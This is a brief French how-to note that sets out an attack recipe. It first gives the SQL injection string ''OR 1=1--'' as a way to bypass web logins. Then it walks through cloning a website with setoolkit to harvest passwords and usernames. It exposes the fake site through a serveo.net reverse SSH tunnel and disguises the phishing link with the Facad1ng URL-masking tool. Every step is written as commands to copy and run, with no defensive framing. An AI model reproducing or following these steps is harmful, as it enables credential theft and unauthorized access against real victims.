language SQL reponse toujours vrai : 'OR 1 =1--'  - faille SQL                    (permet de contourner des mots de passe et autre faille dans une page web)

### linux hack faux site : mots de passe et identifiant repris 
copier toutes les commande une aune dans le terminal linux :  
 
## Installation

### Mettre à jour le système

```bash
sudo apt update
sudo apt upgrade -y
```
### Ouvrir le tool

```bash
clear
sudo setoolkit
```
entrer y apres le password  
puis choisissez 1,2,3 et l option 2  
entrer ton ipv4 :  
puis choisis un site que tu veux cloner  

### creer un lien serveur local

```bash
ssh -R 80:localhost:80 serveo.net -y
```
note le lien  
### Cloner le dépôt

```bash
git clone https://github.com/spyboy-productions/Facad1ng
cd Facad1ng
```

### Créer un environnement virtuel

```bash
python3 -m venv venv
source venv/bin/activate
```

### Installer les dépendances

```bash
clear
pip3 install -r requirements.txt
```

### Lancer le programme

```bash
python3 Facad1ng.py
```
copie colle ton url que tu as noté  
dans mots clé choisis login  
puis choisis un des lien proposer  
